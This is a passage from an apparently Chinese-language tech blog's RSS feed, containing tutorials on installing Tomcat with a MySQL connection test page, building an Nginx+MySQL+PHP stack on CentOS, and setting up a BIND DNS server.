&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/creat_db_tomcat.png&#34; alt=&#34;创建数据库tomcat.png&#34;&gt;
&lt;/div&gt;
&lt;br /&gt;&lt;/p&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/grant_db_tomcat.png&#34; alt=&#34;将数据库tomcat分配给用户tomcat.png&#34;&gt;
&lt;/div&gt;


&lt;h2 id=&#34;安装jdk和tomcat:fbf0d4a2271391a40d84f5a22404d870&#34;&gt;安装jdk和tomcat&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;创建安装jdk和tomcat的文件夹

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/mkdir_java_tomcat.png&#34; alt=&#34;创建安装jdk和tomcat的文件夹.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;下载安装包并解压安装&lt;br /&gt;
jdk包可在&lt;a href=&#34;http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html&#34;&gt;http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html&lt;/a&gt; 下载&lt;br /&gt;
tomcat包可在&lt;a href=&#34;http://mirrors.cnnic.cn/apache/tomcat/tomcat-8/v8.0.36/bin/apache-tomcat-8.0.36.tar.gz&#34;&gt;http://mirrors.cnnic.cn/apache/tomcat/tomcat-8/v8.0.36/bin/apache-tomcat-8.0.36.tar.gz&lt;/a&gt; 下载

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/download_tomcat.png&#34; alt=&#34;下载tomcat安装包.png&#34;&gt;
&lt;/div&gt;
&lt;br /&gt;
&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/cp_jdk_tomcat_to_opt.png&#34; alt=&#34;复制解压后的安装包到/opt下对应目录.png&#34;&gt;
&lt;/div&gt;
&lt;br /&gt;
&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/add_java_env.png&#34; alt=&#34;为java添加环境变量.png&#34;&gt;
&lt;/div&gt;
&lt;br /&gt;
&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/java_version.png&#34; alt=&#34;验证jdk是否设置成功.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;简单配置tomcat:fbf0d4a2271391a40d84f5a22404d870&#34;&gt;简单配置tomcat&lt;/h2&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/config_tomcat.png&#34; alt=&#34;简单配置tomcat1.png&#34;&gt;
&lt;/div&gt;


&lt;h2 id=&#34;启动tomcat:fbf0d4a2271391a40d84f5a22404d870&#34;&gt;启动tomcat&lt;/h2&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/start_tomcat.png&#34; alt=&#34;启动tomcat.png&#34;&gt;
&lt;/div&gt;



&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/see_tomcat_index.png&#34; alt=&#34;访问tomcat主页.png&#34;&gt;
&lt;/div&gt;


&lt;h2 id=&#34;连接数据库:fbf0d4a2271391a40d84f5a22404d870&#34;&gt;连接数据库&lt;/h2&gt;

&lt;p&gt;驱动可在&lt;a href=&#34;http://dev.mysql.com/downloads/connector/j/&#34;&gt;http://dev.mysql.com/downloads/connector/j/&lt;/a&gt; 下载

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tomcat_copy_mysql_driver.png&#34; alt=&#34;复制数据库驱动.png&#34;&gt;
&lt;/div&gt;

[reber@WYB ~]$ vim /opt/tomcat/apache-tomcat-8.0.36/webapps/ROOT/a.jsp&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-jsp&#34;&gt;&amp;lt;%@page contentType=&amp;quot;text/html;charset=utf-8&amp;quot; import=&amp;quot;java.sql.*&amp;quot; %&amp;gt;
&amp;lt;%
    String driver = &amp;quot;com.mysql.jdbc.Driver&amp;quot;; 
    String url = &amp;quot;jdbc:mysql://localhost:3306/tomcat&amp;quot;; //数据库web
    String user = &amp;quot;tomcat&amp;quot;; 
    String password = &amp;quot;123456&amp;quot;; 
    try { 
        Class.forName(driver); 
        Connection conn = DriverManager.getConnection(url, user, password);

        if(!conn.isClosed()) 
            out.println(&amp;quot;数据库连接成功！&amp;quot;); 
        conn.close(); 
    } 
    catch(ClassNotFoundException e) { 
        out.println(&amp;quot;找不到驱动程序&amp;quot;); 
        e.printStackTrace(); 
    } 
    catch(SQLException e) { 
        e.printStackTrace(); 
    } 
%&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/tomcat_conn_mysql.png&#34; alt=&#34;连接数据库.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Linux下搭建Nginx&#43;MySQL&#43;PHP</title>
      <link>http://wyb0.com/posts/Linux%E4%B8%8B%E6%90%AD%E5%BB%BANginx&#43;MySQL&#43;PHP/</link>
      <pubDate>Fri, 17 Jun 2016 22:41:50 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Linux%E4%B8%8B%E6%90%AD%E5%BB%BANginx&#43;MySQL&#43;PHP/</guid>
      <description>

&lt;pre&gt;&lt;code&gt;安装环境为：CentOS-6.5-x86_64-minimal
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;一-准备工作:f660d74f18fcdbfba7b9b088a66c02c3&#34;&gt;一、准备工作&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;首先执行：
    sudo yum groupinstall &amp;quot;Development tools&amp;quot;
安装make：
    yum -y install gcc automake autoconf libtool make
安装g++：
    yum install gcc gcc-c++
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;二-安装mysql和php:f660d74f18fcdbfba7b9b088a66c02c3&#34;&gt;二、安装mysql和php&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo yum install mysql mysql-server mysql-devel
sudo yum install php php-devel
sudo yum install php-gd php-mysql php-fpm
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;三-安装依赖:f660d74f18fcdbfba7b9b088a66c02c3&#34;&gt;三、安装依赖&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;安装pcre、pcre-devel&lt;br /&gt;
sudo yum install pcre pcre-devel&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;安装zlib、zlib-devel&lt;br /&gt;
sudo yum install zlib zlib-devel&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;安装ssl&lt;br /&gt;
sudo yum install openssl openssl-devel&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;四-安装nginx:f660d74f18fcdbfba7b9b088a66c02c3&#34;&gt;四、安装Nginx&lt;/h2&gt;

&lt;p&gt;可在&lt;a href=&#34;http://nginx.org/download/nginx-1.9.9.tar.gz&#34;&gt;http://nginx.org/download/nginx-1.9.9.tar.gz&lt;/a&gt; 下载

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/download_nginx.png&#34; alt=&#34;下载nginx安装包&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;[reber@WYB nginx-1.9.9]$ ./configure
[reber@WYB nginx-1.9.9]$ make
[reber@WYB nginx-1.9.9]$ sudo make install
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;五-启动与关闭nginx:f660d74f18fcdbfba7b9b088a66c02c3&#34;&gt;五、启动与关闭nginx&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# 开启服务：
[reber@WYB nginx-1.9.9]$ sudo /usr/local/nginx/sbin/nginx
# 关闭服务：
[reber@WYB nginx-1.9.9]$ killall nginx
&lt;/code&gt;&lt;/pre&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/visit_nginx.png&#34; alt=&#34;访问nginx.png&#34;&gt;
&lt;/div&gt;


&lt;h2 id=&#34;六-配置nginx支持php:f660d74f18fcdbfba7b9b088a66c02c3&#34;&gt;六、配置nginx支持php&lt;/h2&gt;

&lt;p&gt;[reber@WYB nginx-1.9.9]$ killall nginx&lt;br /&gt;
[reber@WYB nginx-1.9.9]$ vim /usr/local/nginx/conf/nginx.conf&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;location / {
    root   html;
    index  index.html index.htm index.php;
}

location ~ \.php$ {
    root           html;
    fastcgi_pass   127.0.0.1:9000;
    fastcgi_index  index.php;
    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
    include        fastcgi_params;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;[reber@WYB nginx-1.9.9]$ sudo service php-fpm start
[reber@WYB nginx-1.9.9]$ sudo /usr/local/nginx/sbin/nginx
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/visit_nginx_phpinfo.png&#34; alt=&#34;访问nginx的phpinfo.php.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>搭建DNS服务器</title>
      <link>http://wyb0.com/posts/%E6%90%AD%E5%BB%BADNS%E6%9C%8D%E5%8A%A1%E5%99%A8/</link>
      <pubDate>Tue, 14 Jul 2015 14:15:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/%E6%90%AD%E5%BB%BADNS%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid>
      <description>

&lt;h2 id=&#34;环境:211d59e4d4202f6d017761f8ce42837b&#34;&gt;环境&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;虚拟机rhel-server-6.2&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;搭建流程:211d59e4d4202f6d017761f8ce42837b&#34;&gt;搭建流程&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;安装DNS服务器&lt;/li&gt;
&lt;li&gt;配置DNS主配置文件&lt;/li&gt;
&lt;li&gt;配置DNS正反向解析区域数据文件&lt;/li&gt;
&lt;li&gt;启动DNS服务器进行测试&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;安装dns服务:211d59e4d4202f6d017761f8ce42837b&#34;&gt;安装DNS服务&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;挂载光盘&lt;br /&gt;
用mount -o,loop /dev/cdrom /mnt/cdrom命令挂载光盘&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;配置yum源，安装BIND(用命令yum install bind*安装)

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dns_yum_configuration_source.png&#34; alt=&#34;搭建dns配置yum源.png&#34;&gt;
&lt;/div&gt;

安装结果如下：

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dns_install.png&#34; alt=&#34;安装bind.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;进行配置&lt;br /&gt;
vim /etc/named.conf,添加必要的信息

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dns_vim_named_conf.png&#34; alt=&#34;配置dns服务,添加必要的信息.png&#34;&gt;
&lt;/div&gt;

在named.conf的包含文件named.rfc1921.zones中定义区域

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dns_define_regions.png&#34; alt=&#34;配置dns服务,定义区域.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;配置正反向解析文件&lt;br /&gt;
分别配置wyb.cn.hosts和wyb.cn.rev

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dns_analytical_paper_example.png&#34; alt=&#34;解析文件样例.png&#34;&gt;
&lt;/div&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dns_forward_mapping_file.png&#34; alt=&#34;正向解析文件.png&#34;&gt;
&lt;/div&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dns_reverse_mapping_file.png&#34; alt=&#34;反向解析文件.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;验证:211d59e4d4202f6d017761f8ce42837b&#34;&gt;验证&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;用service named start命令启动DNS&lt;br /&gt;
用nslookup命令进行验证，先查看当前采用那台DNS解析，测试反向资源记录以及正反向解析

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dns_test.png&#34; alt=&#34;测试DNS.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
  </channel>
</rss>